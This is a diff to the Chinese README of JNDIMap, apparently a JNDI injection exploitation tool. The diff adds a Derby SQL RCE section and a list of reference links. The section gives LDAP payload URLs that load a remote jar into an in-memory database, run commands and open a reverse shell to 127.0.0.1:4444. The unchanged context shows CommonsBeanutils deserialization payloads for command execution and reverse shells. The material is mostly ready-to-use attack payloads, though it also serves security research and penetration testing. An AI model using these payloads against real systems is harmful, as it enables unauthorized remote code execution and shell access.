@@ -156,10 +156,12 @@ ldap://127.0.0.1:1389/Factory/H2/JavaScript/open -a Calculator
 
 #### Derby
 
-Derby 主从复制反序列化 RCE
+**Derby 主从复制反序列化 RCE**
+
+_JNDI 本身就支持反序列化, 意义不大_
 
 ```bash
-# 1. 创建数据库
+# 1. 创建内存数据库
 ldap://127.0.0.1:1389/Factory/Derby/Create/<database>
 
 # 2. 使用 JNDIMap 快速启动恶意 Derby Server
@@ -182,6 +184,22 @@ Usage: java -cp JNDIMap.jar map.jndi.server.DerbyServer [-p <port>] [-g <gadget>
 `-f`: 指定自定义序列化数据文件
 
 `-h`: 显示 Usage 信息
+
+**Derby SQL RCE**
+
+支持执行命令和原生反弹 Shell
+
+```bash
+# 1. 加载远程 Jar (会自动创建内存数据库)
+ldap://127.0.0.1:1389/Factory/Derby/InstallJar/<database>
+
+# 2. 执行命令/原生反弹 Shell
+ldap://127.0.0.1:1389/Factory/Derby/Command/<database>/open -a Calculator
+ldap://127.0.0.1:1389/Factory/Derby/ReverseShell/<database>/ReverseShell/127.0.0.1/4444
+
+# 3. 删除内存数据库以释放内存
+ldap://127.0.0.1:1389/Factory/Derby/Drop/<database>
+```
 
 ### Deserialize
 
@@ -213,3 +231,13 @@ ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils1NoCC/Command/open -a Calculat
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils1NoCC/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yCg==
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils1NoCC/ReverseShell/127.0.0.1/4444
 ```
+
+## Reference
+
+[https://tttang.com/archive/1405/](https://tttang.com/archive/1405/)
+
+[https://paper.seebug.org/1832/](https://paper.seebug.org/1832/)
+
+[http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce](http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce)
+
+[https://www.yulegeyu.com/2022/11/12/Java 安全攻防之老版本 Fastjson 的一些不出网利用/](https://www.yulegeyu.com/2022/11/12/Java%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E4%B9%8B%E8%80%81%E7%89%88%E6%9C%ACFastjson-%E7%9A%84%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/)
